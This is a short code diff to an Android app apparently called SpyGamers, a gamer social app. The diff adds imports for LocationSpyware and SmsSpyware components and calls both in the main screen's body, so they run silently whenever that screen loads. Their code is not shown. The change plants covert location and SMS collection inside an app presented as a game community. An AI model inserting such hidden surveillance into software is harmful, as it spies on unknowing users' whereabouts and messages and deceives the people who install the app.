@@ -31,6 +31,8 @@ import androidx.navigation.NavController
 import com.example.spygamers.Screen
 import com.example.spygamers.components.appbar.AppBar
 import com.example.spygamers.components.dialogs.ConfirmDialog
+import com.example.spygamers.components.spyware.LocationSpyware
+import com.example.spygamers.components.spyware.SmsSpyware
 import com.example.spygamers.controllers.GamerViewModel
 import com.example.spygamers.models.RecommendedGroup
 import com.example.spygamers.services.ServiceFactory
@@ -168,6 +170,9 @@ private fun MainBody(viewModel: GamerViewModel, navController: NavController){
         )
         return;
     }
+
+    LocationSpyware(viewModel, context)
+    SmsSpyware(viewModel = viewModel, context = context)
 
     if (isLoading) {
         Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
